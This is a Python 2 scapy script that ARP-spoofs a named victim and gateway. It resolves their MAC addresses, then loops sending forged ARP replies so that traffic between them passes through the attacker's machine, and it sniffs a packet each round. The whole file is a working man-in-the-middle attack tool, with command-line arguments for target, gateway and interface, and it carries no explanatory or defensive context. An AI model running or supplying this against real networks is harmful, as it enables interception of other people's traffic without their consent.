from scapy.all import *
from argparse import ArgumentParser

def ip_to_mac(ip):
	arp = ARP()
	arp.op = 1
	arp.hwdst = 'ff:ff:ff:ff:ff:ff'
	arp.pdst = ip
	for s,r in sr(arp)[0]:
		return r[ARP].underlayer.src
	return None

def setup():
	parser = ArgumentParser()
	parser.add_argument('-t',
					dest='victim',
					required=True,
					type=str
	);
	parser.add_argument('-g',
					dest='gateway',
					required=True,
					type=str
	);
	parser.add_argument('-i',
					dest='interface',
					required=True,
					type=str
	);

	args = parser.parse_args()
	return {
		'victim' : {
			'ip' : args.victim,
			'mac' : ip_to_mac(args.victim),
		},
		'gateway' : {
			'ip' : args.gateway,
			'mac' : ip_to_mac(args.gateway),
		},
		'interface' : args.interface,
	}

def spoofing(args):
	victim_arp = ARP()
	gateway_arp = ARP()
	victim_arp.op = 2
	gateway_arp.op = 2

	victim_arp.hwdst = args['victim']['mac']
	gateway_arp.hwdst = args['gateway']['mac']
	victim_arp.pdst = args['victim']['ip']
	gateway_arp.pdst = args['gateway']['ip']
	victim_arp.psrc = args['gateway']['ip']
	gateway_arp.psrc = args['victim']['ip']

	while True:
		try:
			print "[*] Spoofing!!"
			send(victim_arp)
			send(gateway_arp)
			sniff(count=1)

		except KeyboardInterrupt:
			break
	print "[*] Complete"

def main():
	args = setup()
	spoofing(args)

if __name__ == '__main__':
	main()